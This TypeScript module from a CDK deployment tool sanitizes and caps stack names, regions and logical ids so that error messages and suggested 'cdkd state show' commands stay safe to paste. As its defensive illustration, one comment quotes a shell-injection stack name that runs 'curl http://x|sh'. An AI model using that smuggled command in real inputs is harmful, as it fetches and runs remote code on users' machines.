/**
 * The container predicates, the error code, and the identifier display caps every message shares.
 *
 * Part of `src/state/malformed-resources-bag.ts`, which re-exports every public name here.
 */
import {
  IDENT_MAX_CODE_POINTS,
  STACK_REF_MAX_CODE_POINTS,
  UNRENDERABLE,
  displayIdent,
  displaySafe,
  truncateCodePoints,
} from '../../utils/display-safe.js';
import { isReadableBag } from '../../types/state.js';
import type { StackState } from '../../types/state.js';

/**
 * The row name a READ-ONLY command reports for a record whose whole `resources`
 * map is unreadable — `cdkd drift` as a `notCompared` outcome and `cdkd diff`
 * as an unreadable row. Parenthesised so it cannot be mistaken for a logical
 * id, which CloudFormation keeps alphanumeric.
 *
 * A DISPLAY name only (go-to-k/cdkd#3339). A hand-edited record can still key
 * an entry with exactly this text, so no reader decides "the map is gone" from
 * it: `cdkd diff` carries the container in its own field and prints this name
 * from that field; `cdkd drift` keeps it as the outcome's `logicalId` and
 * marks the container with its own `notComparedCause`, which picks the reason
 * text.
 */
export const UNREADABLE_RESOURCES_MAP_ROW = '(resources map)';

/** The error code every malformed-record refusal carries, whatever its class. */
export const STATE_RESOURCES_MALFORMED = 'STATE_RESOURCES_MALFORMED';

/**
 * Answer the ONE question both helpers below key on: can this record's
 * resource map be read at all?
 *
 * Widened past `null` / `undefined` because the message says "no readable
 * resources map" and a hand-edited record does not stop at those two: a
 * `[]`, a `5` or a `"ab"` all survive `Object.entries` and yield a bag that is
 * empty or, for the string, absurd — repaired silently and warned about
 * nowhere. The predicate is the plain-object test the bag's own type implies.
 */
export function hasReadableResources(state: StackState): boolean {
  return isReadableBag(state.resources);
}

/**
 * The same question for the `outputs` bag — and it is a SEPARATE predicate
 * rather than a second argument to the one above because the ABSENCE rule
 * differs, which is the split {@link isReadableBag}'s own note calls a
 * per-container call.
 *
 * An absent `outputs` bag is an ordinary record, not a defect: `cdkd scrub`
 * round-trips one deliberately rather than materializing `{}` over it, and the
 * deploy's failure-path saves write `outputs: currentState.outputs`, which
 * `JSON.stringify` drops when it is `undefined`. So `undefined` is EXEMPT here
 * while it is a defect for `resources`. `null` is NOT exempt — it is a value a
 * hand-edited record carries and every consumer either throws on it or
 * launders it into `{}`.
 *
 * Both {@link repairMalformedOutputsForReadOnly} and
 * {@link refuseMalformedOutputs} delegate to this, so the read-only and the
 * write-capable halves cannot come to different verdicts about the same record.
 */
export function hasReadableOutputs(state: Pick<StackState, 'outputs'>): boolean {
  return state.outputs === undefined || isReadableBag(state.outputs);
}

/**
 * The cap for a value whose grammar is SHORT — an AWS region, or the name of a
 * state container. Unchanged from the literal this module used for every
 * identifier before go-to-k/cdkd#3018 made the cap a parameter, so no message
 * carrying either moves.
 *
 * A logical id does NOT share it: CloudFormation allows 255 characters there
 * (`IDENT_MAX_CODE_POINTS`), and a legitimate 129-to-255-character CDK id cut at
 * 128 renders as a name the record does not hold.
 *
 * It is the cap a REGION is DISPLAYED at in this module (`safeRegion`), and
 * therefore the cap the two `--stack-region` values that sit beside such a
 * display are GATED at: {@link inspectCommand} and `cli/commands/export.ts`'s
 * drift-gap report (which is why it is exported) pass it to the shared gate as
 * `maxCodePoints`, rather than the gate's stack-name default. `gc/scan.ts`, which
 * displays the whole S3 key rather than a region, keeps that default.
 */
export const SHORT_NAME_MAX_CODE_POINTS = 128;

/**
 * The shared explanation, in the terms the reader needs: what is wrong, what
 * to look at, and what NOT to do next.
 *
 * Both identifiers are SANITIZED for the PROSE, and the command beside them is
 * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
 * `.claude/rules/layout-state-types.md` require of any suggestion a user is
 * meant to paste. Inside the command the RAW values go through the shared
 * gate ({@link inspectCommand}): named shell-quoted only when exact and plain,
 * a quoted hole otherwise. Two reasons that is not "sanitized, then quoted":
 *
 * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
 * printable-ASCII allowlist, so it removes the line- and escape-forgery class
 * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
 * trusted here, since a stack name reaches the cross-stack read path from an
 * `Fn::GetStackOutput` argument or an S3 key. A name spelled
 * `a'; curl http://x|sh; echo '` sanitizes to itself; unquoted it would close
 * the quoting and append its own command to the line this text tells the user
 * to RUN, and quoted its spelling is what an operator strips — which is why
 * the gate holes it rather than quoting it.
 *
 * Wrapping the command in `'...'` is not enough either, and is what makes the
 * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
 * produces something unpastable. Hence unwrapped and last.
 *
 * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` in the prose
 * rather than nothing, so the sentence names a damaged identity rather than
 * none; in the command the gate prints a hole for it, since an empty argument
 * makes `--stack-region` swallow the next flag.
 *
 * MODULE-PRIVATE, and it stayed that way after go-to-k/cdkd#3206's review
 * considered exporting it. `cdkd scrub`'s audited-record refusal needed the
 * same three properties (sanitize, cap, `UNRENDERABLE` on empty) plus a
 * BOUNDARY, because its names go into a comma-joined list where a name
 * containing the delimiter forges an entry. `displayIdent` has all four —
 * JSON-quoting escapes the delimiter it adds — so that caller uses it and this
 * stays private. The pair here is not duplicated: what differs is the
 * `shellQuote` composition every message in THIS module needs and that one
 * must not have.
 *
 * The helper itself carries no `buildForceUnlockCommand`-style exactness gate,
 * which SUPPRESSES a whole command when sanitizing changed the value. The
 * difference is what the command DOES: `cdkd force-unlock` deletes another
 * process's lock, so naming a stack that is not quite the record's is
 * destructive and suppressing is right. The command most texts here end on is
 * `cdkd state show`, which reads, and since go-to-k/cdkd#3436's fold-in
 * {@link inspectCommand} builds it through the shared `pasteableCommand`
 * gate: a name sanitizing would change prints as a quoted HOLE, never as its
 * sanitized spelling (which could select a sibling record the altered name
 * happens to match) and never as nothing (which leaves a broken record with no
 * next step at all). A text that points at a command which WRITES owns the
 * gate at its own site: {@link malformedDestroyResourcesRefusalMessage} names
 * no target unless both identifiers render exactly, and gives
 * `cdkd state orphan` as a template.
 */
export function safeIdentifier(value: string, maxCodePoints: number): string {
  // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
  // planted multi-kilobyte one would push the trailing remedy command off the
  // reader's screen -- the message would be technically correct and useless.
  // `truncateCodePoints` rather than `slice`, so the cut never lands inside a
  // surrogate pair; `displaySafe` rather than `displayIdent`, because the
  // latter JSON-quotes and that would compose badly with `shellQuote` below.
  //
  // The cap is a REQUIRED parameter, so no site can fall into a region-sized
  // default. Most RECORD-DERIVED identifiers reach it through the per-kind
  // helpers below; two builders pass a cap directly — cdkd's own container
  // names take `SHORT_NAME_MAX_CODE_POINTS`, whose own doc carries the reason
  // and whose names are not record-derived at all, and
  // `divergentRecordRegionRefusalMessage` measures a key region at the
  // state-record grammar's cap (go-to-k/cdkd#3328) rather than a region's, for
  // the reason stated at that site. A stack name takes
  // `STACK_REF_MAX_CODE_POINTS`, the grammar a cdkd state-record reference is
  // legitimate up to and the same bound `isPasteableIdent` uses: at 128 an
  // ordinary multi-level CDK nested child
  // (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150 code
  // points) truncates, which named a stack that does not exist and made
  // `malformedDestroyResourcesRefusalMessage`'s exactness verdict take its
  // fallback arm on a HEALTHY record. Still bounded, so a planted
  // multi-kilobyte name is truncated too.
  const safe = displaySafe(value, { asciiOnly: true });
  if (!safe) return UNRENDERABLE;
  const { text, truncated } = truncateCodePoints(safe, maxCodePoints);
  return truncated ? `${text}...` : text;
}

/*
 * One named helper per identifier KIND, and no default cap on the shared body.
 * The cap used to be a defaulted parameter, and the default was the region's:
 * every stack-name site that forgot to pass the wider one — four of them, found
 * across two review rounds and not all by the same reader — silently cut a
 * legitimate `Parent~Child~...` name at 128 and emitted a remedy command naming
 * a stack that does not exist. A named helper cannot be called with the wrong
 * cap, and a new kind of RECORD-DERIVED identifier has to be added here rather
 * than improvised at a site. (Container names are cdkd's own fixed literals, not
 * record-derived, and take the short cap directly at their one site.)
 */

/**
 * A stack name, which a nested chain makes legitimately long.
 *
 * Safe for a command that only READS. A caller building a command that WRITES
 * owns an exactness gate as well — print the command only when this returns the
 * value unchanged, since a name sanitizing altered can resolve to a different
 * stack — whenever the identity can hold characters sanitizing alters: anything
 * not already validated, whether a user typed it or the record supplied it.
 * `reportDriftBaselineGaps` (`src/cli/commands/export.ts`) gates its
 * `refresh-observed` command for that reason: `cdkd export --template` takes
 * the stack name as a free-typed positional, and the record BODY is a second
 * source when a caller omits the loaded identity. A synthesized stack name is
 * not an exception by itself — a prebuilt cloud assembly's name is read
 * unvalidated — which is why `dropRecordCommand` gates its substitution, now
 * through the shared gate (go-to-k/cdkd#3360, closed by go-to-k/cdkd#3363;
 * go-to-k/cdkd#3436).
 */
export function safeStackName(value: string): string {
  return safeIdentifier(value, STACK_REF_MAX_CODE_POINTS);
}

/** An AWS region. */
export function safeRegion(value: string): string {
  return safeIdentifier(value, SHORT_NAME_MAX_CODE_POINTS);
}

/**
 * A CloudFormation logical id, as it appears in a LIST of ids — which is the
 * only way this module and its callers print one.
 *
 * NOT {@link safeIdentifier}, although it is the obvious third sibling, and it
 * used to be exactly that. `displaySafe` TRIMS, so a sanitize-then-quote pair
 * renders a torn `resources["Bucket "]` byte-identically to a healthy sibling
 * `Bucket`, and the message sends the reader to the intact record while the
 * damaged one goes unnamed. `displayIdent` compares the sanitized text with the
 * raw one and JSON-quotes whenever they differ, so a padded or rewritten id can
 * never render bare. Past that, what it shows is judged on the text it KEEPS:
 * a kept part holding a character outside the plain-identifier set (`'`, a
 * space) is wrapped in double quotes with an embedded `"` escaped, so text an
 * id plants on a line that ends in a pasteable command stays visibly inside one
 * quoted token. A cut id is followed by `cutMarker`'s
 * `[cut: N more characters withheld, tail sha256:<hex>]`, which cannot be read
 * as part of it — so a plain 255-character prefix renders bare with that
 * marker even when the withheld tail held a `'`, and nothing of the tail is
 * shown, only its digest. An id with nothing renderable left is the bare
 * `<unrenderable>` stand-in. A
 * bare `,` inside a plain id still reads as two entries in a `', '`-joined list
 * — the residual go-to-k/cdkd#3179 records for every caller of the helper. That
 * is the answer go-to-k/cdkd#3317 recorded for
 * `namedPropertyBagsDiagnosis`; this is the same rule for the other lists, so two
 * sibling clauses in one module cannot give opposite answers.
 *
 * Capped at `IDENT_MAX_CODE_POINTS`, a logical id's own limit, rather than a
 * region-sized cut that would name no record.
 */
export function displayLogicalId(value: string): string {
  return displayIdent(value, { maxCodePoints: IDENT_MAX_CODE_POINTS });
}

/**
 * `''` is NOT an identity, and every renderer below treats it as one
 * (go-to-k/cdkd#3520). `safeStackName('')` and `safeRegion('')` are both
 * `UNRENDERABLE`, so an empty region rendered `('<unrenderable>')` in the
 * clause AND `--stack-region '<unrenderable>'` in the command the reader
 * pastes — a flag that selects no record at all, on a message whose whole job
 * is to send them to the damaged one. `undefined` already means "absent" to
 * {@link stackClause} and {@link inspectCommand}, which drop the clause and
 * the flag, and that is the right answer for both identifiers.
 *
 * Every message that renders an identity calls this and then
 * {@link stackClause} / {@link inspectCommand} rather than spelling the clause
 * and the command again (go-to-k/cdkd#3526): for a present identity those two
 * render byte-identically to what each builder used to build by hand, and for
 * an absent one they give the no-identity form and the hole template instead
 * of `<unrenderable>`. That is why the per-site note is one line — the reason
 * lives here.
 *
 * NORMALISE AT THE BOUNDARY. `dropRecordCommand`, `withheldVerdict` and
 * `orphanInspectClause` each carry their own `=== ''` arm on purpose, so this
 * is not the module's only floor — but a floor in the SHARED helpers was tried
 * here and removed, and the reason is NOT that nothing reaches them: three
 * unboundaried builders do. It is that each passes `exact ? x : undefined`,
 * and `''` is never exact — `safeIdentifier('')` is the placeholder, so
 * `safeStackName('') !== ''` — so those helpers already receive `undefined`
 * and a floor there reddened no case. The boundary is what covers every
 * helper a builder reaches at once, which is the property
 * {@link malformedOrphanResourcePropertiesRefusalMessage} measured when
 * guarding inside ONE helper fixed only part of its message.
 *
 * Not reachable from today's callers: `cdkd state`'s sites sit below an
 * `if (!ref.region) throw`, which is falsy and so rejects `''` too, and
 * `cdkd export` normalises at its own call. What was missing is the CONTRACT —
 * a caller that hands `''` got the placeholder silently, and the guard that
 * would have caught it lived in another file.
 *
 * One cost, stated rather than discovered later: an empty STACK name with a
 * real region now drops that region from the clause and the command too, since
 * {@link inspectCommand} answers a missing stack with the two-hole template.
 * That is the existing `undefined` behaviour rather than a new rule — a record
 * cdkd cannot name is one it cannot build a selecting command for either.
 */
export function absentIfEmpty(value: string | undefined): string | undefined {
  return value === '' ? undefined : value;
}
